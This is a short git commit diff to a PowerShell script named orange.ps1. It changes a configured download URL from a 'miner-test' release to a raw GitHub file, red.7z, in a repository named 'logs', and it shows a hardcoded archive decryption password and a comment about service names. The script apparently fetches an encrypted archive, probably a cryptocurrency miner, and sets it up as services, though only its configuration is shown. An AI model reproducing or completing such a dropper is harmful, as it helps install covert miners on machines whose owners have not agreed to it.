66ccf7ba6fe7de9e2773f134c0700861e02f3d05
flanker411 <shivjain411@gmail.com>
2026-04-05 11:45:07 +0530

    Update orange.ps1

--- orange.ps1
+++ orange.ps1
@@ -4,7 +4,7 @@
 # ============================================
 
 # CONFIGURATION - CHANGE THESE!
-$Red7zUrl = "https://github.com/YOUR_USERNAME/miner-test/releases/download/v1.0.0/red.7z"  # YOUR URL HERE
+$Red7zUrl = "https://raw.githubusercontent.com/flanker411/logs/refs/heads/main/red.7z"  # YOUR URL HERE
 $DecryptionPassword = "red!"  # MUST match what you used for grey.7z
 
 # Test service names (use obvious names for testing)
